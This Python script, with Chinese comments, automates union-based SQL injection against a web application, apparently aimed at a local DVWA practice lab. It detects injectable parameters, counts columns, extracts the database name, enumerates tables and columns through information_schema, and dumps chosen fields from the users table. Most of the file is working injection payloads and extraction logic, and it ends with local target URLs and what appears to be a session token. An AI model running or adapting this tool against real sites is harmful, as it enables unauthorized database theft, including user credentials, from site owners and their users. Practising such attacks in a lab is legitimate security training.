from includee import *
import re
import tkinter
# 联合查询注入
def judge_union_attack(url,headers):
    if sql_union_inject1("1' and '1'='1",url,headers) != sql_union_inject1("1' and '1'='2",url,headers):
        printf("存在注入点，为字符型注入")
        return 1
    elif sql_union_inject1("1 and 1=1",url,headers) != sql_union_inject1("1 and 1=2",url,headers):
        printf("存在注入点，为数字型注入")
        return 2
    else:
        printf("不存在注入点")
        return 0

def sql_union_attack(url,headers):
    if judge_union_attack(url,headers)==0:
        quit()
    printf("猜解回显字段数...")
    re_str = 0
    for i in range(1,10):
        sql = f"1'+order+by+{i}%23"
        r = sql_union_inject(sql, url, headers)
        if r != '0':
            re_str += 1
        else:
            break
    printf("回显字段数为:"+str(re_str))
    printf("正在猜解数据库名...")
    sql = f"1'+union+select+1%2Cconcat(0x7e%2Cdatabase()%2C0x7e)%23"
    # sql = 1' union select 1,concat(0x7e,database(),0x7e)#
    r = sql_union_inject(sql, url, headers)
    databasename = re.findall('~(.*?)~', r)
    printf("数据库名为:"+databasename[0])
    printf("是否继续，y/N  ")
    n = input()
    if n == 'y' or n == 'Y':
        printf("正在继续")
    else:
        quit()
    sql = f"1'+union+select+1%2Cconcat(0x7e%2Cgroup_concat(table_name)%2C0x7e)+from+information_schema.tables+where+table_schema%3D'{databasename[0]}'%23"
    r = sql_union_inject(sql, url, headers)
    r = re.findall('~(.*?)~', r)
    table_name = [] # 存储表信息
    rs = str(r).split('[\'')[1] # 分割表信息
    rs = rs.split('\']')[0]
    if rs.find(",") != -1:
        table_name = rs.split(',')
    elif len(rs) != 0:
        table_name.append(rs)
        printf("正在打印所有表信息...")
        print("\033[0;33m-\033[0m" * 20)
        j = 1
        for i in table_name:
            str1 = f'[{j}]'
            print(str1 + i)
            j += 1
        print("\033[0;33m-\033[0m" * 20)
    else:
        printf("无表信息")
    printf("正在打印所有表信息...")
    print("\033[0;33m-\033[0m" * 20)
    j = 1
    for i in table_name:
        str1 = f'[{j}]'
        print(str1 + i)
        j += 1
    print("\033[0;33m-\033[0m" * 20)
    printf('请输入你想要查看的表名:')
    chose_table_name = input()
    # 猜解想要知道的表内的列信息
    printf("正在猜解表" + chose_table_name + "的信息...")
    sql = f"1%27+union+select+1%2Cconcat%280x7e%2Cgroup_concat%28column_name%29%2C0x7e%29+from+information_schema.columns+where+table_name%3D%27users%27%23&Submit=Submit#"
    column_name = []
    r = sql_union_inject(sql, url, headers)
    r = re.findall('~(.*?)~', r)
    rs = str(r).split('[\'')[1]  # 分割字段信息
    rs = rs.split('\']')[0]
    if rs.find(",") != -1:
        column_name = rs.split(',')
    elif len(rs) != 0:
        column_name.append(rs)
    else:
        printf("无字段信息")
    printf("正在打印" + chose_table_name + "表的所有字段")
    print("\033[0;33m-\033[0m" * 20)
    num = 1
    for i in column_name:
        n = f"[{num}]"
        print(n + i)
        num += 1
    print("\033[0;33m-\033[0m" * 20)
    while True:
        printf("请选择想要查看的字段信息,退出请输入!q")
        column_in = input()
        if column_in == '!q':
            printf("注入结束")
            quit()
        else:
            data = []
            sql = f"1'+union+select+1%2C(select+concat(0x7e%2Cgroup_concat({column_in})%2C0x7e)+from+dvwa.users)%23"
            r = sql_union_inject(sql,url,headers)
            r = re.findall('~(.*?)~', r)
            rs = str(r).split('[\'')[1]  # 分割字段信息
            rs = rs.split('\']')[0]
            if rs.find(",") != -1:
                data = rs.split(',')
            elif len(rs) != 0:
                data.append(rs)
            else:
                printf("无信息")
            if len(data) != 0:
                printf("正在打印" + column_in)
                print("\033[0;33m-\033[0m" * 20)
                num = 1
                for i in data:
                    n = f"[{num}]"
                    print(n + i)
                    num += 1
                print("\033[0;33m-\033[0m" * 20)
# http://192.168.1.13/DVWA/vulnerabilities/sqli_blind/
# http://192.168.1.13/DVWA/vulnerabilities/sqli/
# mch2bnefrv3oci3u4s3550e39d